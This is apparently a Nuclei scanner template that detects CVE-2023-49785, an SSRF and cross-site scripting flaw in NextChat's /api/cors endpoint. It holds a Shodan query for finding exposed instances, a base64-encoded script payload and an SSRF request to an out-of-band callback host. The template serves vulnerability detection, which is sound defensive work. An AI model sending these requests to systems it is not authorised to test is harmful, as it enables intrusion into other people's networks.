id: CVE-2023-49785

info:
  name: ChatGPT-Next-Web - SSRF/XSS
  author: high
  severity: critical
  description: |
    Full-Read SSRF/XSS in NextChat, aka ChatGPT-Next-Web
  impact: |
    Unauthenticated attackers can exploit SSRF vulnerabilities through the /api/cors endpoint to access internal network resources and inject malicious JavaScript for cross-site scripting attacks.
  remediation: |
    Do not expose to the Internet
  reference:
    - https://www.horizon3.ai/attack-research/attack-blogs/nextchat-an-ai-chatbot-that-lets-you-talk-to-anyone-you-want-to/
    - https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cve-id: CVE-2023-49785
    cwe-id: CWE-79
    epss-score: 0.92643
    epss-percentile: 0.99738
  metadata:
    verified: true
    max-request: 2
    shodan-query: "title:NextChat,\"ChatGPT Next Web\""
  tags: cve,cve2023,ssrf,xss,chatgpt,nextchat,vkev,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/cors/data:text%2fhtml;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+%23"
      - "{{BaseURL}}/api/cors/http:%2f%2fnextchat.{{interactsh-url}}%23"

    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - contains(body_1, "<script>alert(document.domain)</script>")
          - contains(header_1, "text/html")
        condition: and

      - type: dsl
        dsl:
          - contains(header_2,'X-Interactsh-Version')
          - contains(interactsh_protocol_2,'dns')
        condition: and
# digest: 490a0046304402203109b155ed6aab4e933f051a28f16e1be86ccbf294a66967e7eeaad96c1eead002202fd3f7db98b926da757ddad58b2115360ec57f96351148cf8b21b3f6a30d37b7:922c64590222798bb761d5b6d8e72950